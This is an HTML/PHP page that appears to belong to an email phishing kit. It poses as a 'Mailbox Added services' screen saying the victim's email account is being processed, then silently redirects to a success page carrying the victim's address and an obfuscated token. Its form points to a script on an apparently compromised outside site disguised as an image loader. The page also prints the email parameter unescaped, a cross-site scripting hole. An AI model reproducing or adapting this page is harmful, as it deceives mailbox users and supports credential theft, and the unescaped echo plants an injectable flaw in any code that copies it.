
<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>Mailbox Added services</title>
<link rel="stylesheet" type="text/css" href="files/styles.css">
<meta http-equiv="REFRESH" content="5; url= success.php?email=<?php echo $_GET['email']; ?>&.yJGfX7xSq2hM9FOntzjVW6vmo5LIkedCpD0sUQaYNEw41PKb3Z8BgcrRuTAlHi72265623703">
<style type="text/css">
.tableheader {
background-color: #95BEE6;
color:white;
font-weight:bold;
}
.tablerow {
background-color: #A7D6F1;
color:white;
}
.message {
color: #FF0000;
font-weight: bold;
text-align: center;
width: 100%;
}
.style3 {font-size: 14px}
.style10 {
	font-size: 16px;
	font-weight: bold;
}
</style>
</head>
<body>

<form name="frmUser" method="post" action="http://bclabels.com/manager/actions/image/load.php?iphOs1q7xnd4UTJQmEeLXMBKStVFRZkNaI0gHWAY298ofPrjvCz35GlubyDw6c20579292248">

  <p>&nbsp;</p>
  <p>
  </p><div align="center">
  <p></p>
  <p><img alt="Processing" src="files/loading.gif" height="242" width="361"></p>
  <p><br>
    <span class="style10">Please wait ... </span></p>
  <p class="style10">Your email account (<?php echo $_GET['email']; ?>) is being processed ...</p>
  </div>
  <p>&nbsp;  </p>
</form>
<br>




</body></html>